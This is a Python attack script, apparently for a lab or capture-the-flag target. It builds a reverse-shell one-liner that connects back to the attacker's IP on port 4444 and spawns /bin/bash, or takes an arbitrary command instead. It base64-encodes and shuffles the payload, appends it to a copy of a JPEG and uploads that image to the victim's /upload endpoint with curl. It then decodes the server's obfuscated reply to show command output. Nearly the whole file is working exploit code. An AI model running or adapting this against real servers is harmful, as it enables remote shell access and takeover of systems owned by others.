import base64, sys, subprocess

if (len(sys.argv) < 4):
    print("args format: [your ip] [victim ip] [http or https] [optional: command]")
    sys.exit(-1)

your_ip = sys.argv[1]
victim_ip = sys.argv[2]
mode = sys.argv[3]

# if command given, run that command
if (len(sys.argv) == 5):
    text = "START:" + sys.argv[4]
else: 
    # encode the ip
    text = f"""START:python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{your_ip}",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"""
encoded_bytes = base64.b64encode(text.encode("utf-8"))
encoded_str = encoded_bytes.decode("ascii")

arr = []
while (len(encoded_str) > 0):
    arr.append(encoded_str[:4])
    encoded_str = encoded_str[4:]

# shuffle 1
arr1 = []
front = True
while (arr):
    last = arr.pop()
    if (front == True):
        arr1.insert(0, last)
    else:
        arr1.append(last)
    front = not front

# shuffle 2
arr2 = arr1.copy()
for i in range (len(arr1)):
    if (i % 2 == 0 and i + 1 < len(arr1)):
        arr2[i] = arr1[i+1]
        arr2[i+1] = arr1[i]

shuffled_str = "".join(arr2)

# duplicate cat file
command = ["cp", "cat.jpg", "catbackup.jpg"]
subprocess.run(command)

# append command to cat file
with open("catbackup.jpg", "a", encoding="utf-8") as f:
    f.write(shuffled_str)

if (mode == "https"):
    url = f"https://{victim_ip}/upload"
    command = ["curl", "-X", "POST", "--data-binary", "@catbackup.jpg", "-H", "Content-Type: image/jpeg", "-H", "filename: catbackup.jpg", "--cacert", "ca.crt", "--cert", "client.crt", "--key", "client.key", url]
# default to http
else: 
    url = f"http://{victim_ip}/upload"
    command = ["curl", "-X", "POST", "--data-binary", "@catbackup.jpg", "-H", "Content-Type: image/jpeg", "-H", "filename: catbackup.jpg", url]

result = subprocess.run(command, capture_output=True, text=True, check=True)

def unshuffle(shuffled):
    arr = [shuffled[i:i + 4] for i in range(0, len(shuffled), 4)]
    size = len(arr)

    # shuffle 2: swap pair
    for i in range(0, size - 1, 2):
        temp = arr[i]
        arr[i] = arr[i + 1]
        arr[i + 1] = temp

    # shuffle 1: unravel from inside
    middle = (size - 1) // 2
    result = [arr[middle]]

    count = 1
    while middle + count < size or middle - count >= 0:
        if middle + count < size:
            result.append(arr[middle + count])
        if middle - count >= 0:
            result.append(arr[middle - count])
        count += 1

    # The original shuffle took items from the end with pop().
    result.reverse()
    return "".join(result)

unshuffled = unshuffle(result.stdout.strip())

# 1. Decode Base64 to raw bytes
decoded_bytes = base64.b64decode(unshuffled)

# 2. Convert bytes to a readable string
decoded_str = decoded_bytes.decode("utf-8")

print(decoded_str)